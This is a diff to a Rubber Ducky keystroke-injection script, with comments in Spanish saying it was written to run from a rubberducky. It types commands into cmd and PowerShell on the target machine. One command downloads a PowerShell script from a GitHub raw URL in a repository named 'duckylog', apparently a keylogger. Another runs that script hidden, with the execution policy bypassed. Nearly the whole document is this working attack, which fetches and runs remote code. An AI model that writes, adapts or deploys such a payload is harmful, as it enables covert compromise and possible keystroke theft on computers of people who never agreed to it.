@@ -13,19 +13,33 @@ Creado con la idea de ejecutarlo remotamente desde un rubberducky.
 # ---------------------------------------------------------
 
 DELAY 20
+
 GUI r
+
 DELAY 20
+
 STRING cmd
+
 ENTER	
+
 ENTER
+
 DELAY 20
+
 STRING powershell
+
 ENTER
+
 DELAY 20
+
 STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/C4sp3r2222/duckylog/main/script.ps1" -OutFile "$env:USERPROFILE\Desktop\script.ps1"
+
 ENTER
+
 DELAY 300
+
 STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Users\$env:USERNAME\Desktop\script.ps1' -WindowStyle Hidden -ErrorAction SilentlyContinue"
+
 ENTER
 
 
